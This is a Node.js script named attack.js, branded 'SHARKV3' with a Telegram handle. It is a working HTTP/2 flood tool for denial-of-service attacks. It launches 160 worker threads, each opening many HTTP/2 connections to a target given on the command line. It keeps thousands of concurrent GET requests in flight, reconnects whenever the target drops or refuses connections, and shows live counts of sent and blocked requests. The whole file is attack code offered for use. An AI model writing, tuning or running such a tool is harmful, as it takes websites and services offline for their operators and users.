const http2 = require('http2');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { cpus } = require('os');
const readline = require('readline');
const net = require('net');

const THREADS = 32;
const INITIAL_CONNECTIONS = 45;
const POWER_MULTIPLIER = 4;
const MAX_INFLIGHT = 4000;
const LIVE_REFRESH_RATE = 1100;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;

const LOCAL_PORT = Math.floor(10000 + Math.random() * 50000);

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.clear();
    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
    console.log(`SHARKV3! - NO CPU WARMUP .exx`);
    console.log(`PORT: ${LOCAL_PORT}`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, {
            workerData: { target, duration, initial: true, port: LOCAL_PORT }
        });
    }

    for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
        new Worker(__filename, {
            workerData: { target, duration, initial: false, port: LOCAL_PORT }
        });
    }

    setInterval(() => {
        maxRps = Math.max(maxRps, rpsLastSecond);
        renderStats();
        rpsLastSecond = 0;
    }, LIVE_REFRESH_RATE);

    function renderStats() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);
        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);
        console.log(`total: ${totalRequests}`);
        console.log(`max-r: ${maxRps}`);
        console.log(`===========================`);
        console.log(`succes: ${successCount}`);
        console.log(`Blocked: ${errorCount}`);
    }

    const server = net.createServer(socket => {
        socket.on('data', data => {
            const msg = data.toString();
            if (msg === 'req') totalRequests++, rpsLastSecond++;
            else if (msg === 'ok') successCount++;
            else if (msg === 'err') errorCount++;
        });
    });
    server.listen(LOCAL_PORT);
} else {
    const { target, duration, initial, port } = workerData;
    const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
    const end = Date.now() + duration * 1000;

    const socket = net.connect(port, '127.0.0.1');
    const sendStat = msg => socket.write(msg);

    function sendLoop(client, inflight) {
        if (Date.now() > end || client.destroyed) return;

        while (inflight.count < MAX_INFLIGHT) {
            try {
                inflight.count++;
                const req = client.request({ ':method': 'GET', ':path': '/' });

                req.on('response', () => {
                    inflight.count--;
                    sendStat('ok');
                });

                req.on('error', () => {
                    inflight.count--;
                    sendStat('err');
                });

                req.end();
                sendStat('req');
            } catch {
                inflight.count--;
                sendStat('err');
            }
        }

        setTimeout(() => sendLoop(client, inflight), 5); // smooth burst
    }

    function createConnection() {
        if (Date.now() > end) return;

        try {
            const client = http2.connect(target, {
                settings: {
                    enablePush: false,
                    maxConcurrentStreams: 1000,
                }
            });

            const inflight = { count: 0 };

            client.on('error', () => {
                client.destroy();
                setTimeout(createConnection, 100);
            });

            client.on('goaway', () => client.close());
            client.on('close', () => setTimeout(createConnection, 100));

            client.on('connect', () => {
                for (let i = 0; i < 120; i++) {
                    setTimeout(() => sendLoop(client, inflight), i * 5);
                }
            });
        } catch {
            setTimeout(createConnection, 200);
        }
    }

    for (let i = 0; i < connections; i++) {
        setTimeout(createConnection, i * 10);
    }
}
